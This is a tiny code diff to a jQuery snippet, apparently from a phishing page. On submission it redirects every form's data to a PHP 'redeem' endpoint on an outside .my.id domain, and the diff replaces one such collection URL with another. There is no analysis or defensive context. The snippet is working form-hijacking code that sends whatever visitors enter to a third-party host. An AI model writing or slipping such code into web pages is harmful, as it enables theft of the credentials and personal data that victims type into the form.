@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://jinkontot-contole.my.id/reedem.php");
+  $(myform).attr("action", "https://romusa-sabose-santos.my.id/redem.php");
 });
